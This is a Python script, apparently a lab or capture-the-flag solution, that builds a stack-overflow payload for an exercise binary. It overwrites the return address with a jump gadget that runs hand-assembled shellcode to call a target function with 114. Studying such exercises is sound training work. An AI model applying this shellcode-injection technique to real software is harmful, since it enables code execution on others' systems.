import struct

# Problem 3 Payload Generation
# Goal: Output 'Your lucky number is 114'
# Method: Ret2Shellcode (Jump to Stack)
# Vulnerability: Stack overflow in func() allows overwriting return address.
# Constraint: Standard shellcode injection, but stack address is random (ASLR).
# Bypass: The binary saves the stack pointer to a global variable 'saved_rsp'.
#         There is a helper function 'jmp_xs' (0x401334) that jumps to 'saved_rsp + 0x10'.
#         'saved_rsp + 0x10' points exactly to the start of our input buffer.

# Addresses:
# func1: 0x401216 (Target function, requires rdi=114)
# jmp_xs: 0x401334 (Gadget to jump to buffer)

# Shellcode Construction:
# We need to set rdi = 114 (0x72) and call func1.
# Assembly:
#   mov rdi, 114
#   mov rax, 0x401216
#   call rax

# Opcode:
# mov rdi, 0x72 -> \xbf\x72\x00\x00\x00
# mov eax, 0x401216 -> \xb8\x16\x12\x40\x00
# call rax -> \xff\xd0

shellcode = b"\xbf\x72\x00\x00\x00" + b"\xb8\x16\x12\x40\x00" + b"\xff\xd0"

# Buffer length is 32 bytes.
# Shellcode is 12 bytes.
# Padding needed = 32 - 12 = 20 bytes.
padding_buffer = b'\x90' * 20  # NOP padding

# Saved RBP (8 bytes) - junk
saved_rbp = b'B' * 8

# Return Address - overwrite with address of jmp_xs
jmp_xs_addr = struct.pack('<Q', 0x401334)

payload = shellcode + padding_buffer + saved_rbp + jmp_xs_addr

with open('ans3.txt', 'wb') as f:
    f.write(payload)

print("ans3.txt generated.")
